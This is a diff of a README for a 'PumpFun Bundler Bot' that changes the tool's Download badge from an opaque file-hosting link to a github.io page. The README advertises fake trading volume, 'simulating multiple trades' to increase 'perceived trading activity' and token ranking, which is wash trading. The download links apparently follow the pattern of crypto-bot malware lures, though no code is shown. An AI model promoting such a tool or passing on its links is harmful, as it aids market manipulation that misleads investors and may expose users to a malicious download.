@@ -2,7 +2,7 @@
 
 **PumpFun Bundler Bot** is a powerful tool for **Pump.Fun** memecoin projects that helps automate trading volume and bundle transactions. By simulating multiple trades and bundling them together, the bot optimizes gas fees and generates more volume for your token, giving it better visibility and engagement without needing manual trading. This bot is ideal for memecoin promoters and developers who want to increase market presence and boost their token’s ranking on **Pump.Fun**.
 
-[![Download PumpFun Bot](https://img.shields.io/badge/Download-PumpFun%20Bot-blueviolet)](https://downloadifiles.com?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download PumpFun Bot](https://img.shields.io/badge/Download-PumpFun%20Bot-blueviolet)](https://pumpfun-volume-bot.github.io/.github/)
 
 ## 🔥 Features:
 - **Transaction Bundling:** Automate the bundling of multiple transactions to reduce gas fees and increase perceived trading activity.
